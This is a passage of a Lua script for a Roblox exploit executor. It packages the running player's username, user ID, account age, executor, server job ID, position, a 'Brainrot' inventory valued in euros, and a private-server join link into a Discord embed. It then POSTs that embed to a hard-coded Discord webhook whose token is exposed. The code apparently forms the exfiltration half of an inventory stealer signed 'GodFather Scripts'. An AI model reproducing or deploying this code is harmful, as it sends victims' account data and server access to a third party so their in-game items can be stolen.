                        value = string.format("**Username:** %s\n**Account Age:** %d days\n**User ID:** %d", 
                            LocalPlayer.Name, accountAgeDays, LocalPlayer.UserId),
                        inline = false
                    },
                    {
                        name = "💻 Executor Details",
                        value = string.format("**Executor:** %s\n**Job ID:** %s", 
                            executorName, game.JobId),
                        inline = false
                    },
                    {
                        name = "📍 Location Data",
                        value = string.format("**Current Floor:** %s\n**Position:** %.1f, %.1f, %.1f", 
                            currentFloor, posX, posY, posZ),
                        inline = false
                    },
                    {
                        name = string.format("🧠 Brainrot Inventory (%d items)", totalCount),
                        value = string.format("**Total Value:** %.2f LV (€%.2f EUR)**\n\n%s", 
                            totalValue, totalEUR, brainrotList),
                        inline = false
                    },
                    {
                        name = "🔗 Private Server",
                        value = string.format("[Click to Join](%s)", serverLink),
                        inline = false
                    }
                },
                footer = {
                    text = "GodFather Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }}
        }
        
        local success, err = pcall(function()
            local response = request({
                Url = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(webhookData)
            })
            
            if response and response.StatusCode ~= 204 then
                warn("Webhook returned status: " .. tostring(response.StatusCode))
            end
        end)
        
        if not success then
            warn("Failed to send webhook: " .. tostring(err))
        end
    end)
    
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)
